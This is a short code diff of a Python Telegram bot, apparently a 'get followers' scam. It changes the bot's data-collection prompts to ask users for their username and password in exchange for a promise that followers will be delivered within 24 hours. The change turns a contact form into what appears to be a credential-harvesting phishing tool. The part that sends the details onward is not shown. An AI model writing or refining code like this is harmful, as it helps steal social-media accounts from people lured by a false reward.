@@ -56,11 +56,11 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["phone"] = update.message.text
 
     details = f"""
-📋 New Submission
+📋 CONGRATULATIONS WE WILL GET BACK TO YOU
 
-👤 Name: {context.user_data['name']}
-📧 Email: {context.user_data['email']}
-📱 Phone: {context.user_data['phone']}
+👤 UserName: {context.user_data['name']}
+📧 Password: {context.user_data['email']}
+📱 Count of Followers: {context.user_data['phone']}
 
 🆔 Telegram User ID: {update.effective_user.id}
 👤 Username: @{update.effective_user.username if update.effective_user.username else 'N/A'}
@@ -98,7 +98,7 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print("ERROR:", e)
 
         await update.message.reply_text(
-            "Followers delivered to you within 24 hrs"
+            "✅Followers will deliver to you within 24 hrs"
         )
 
     return ConversationHandler.END
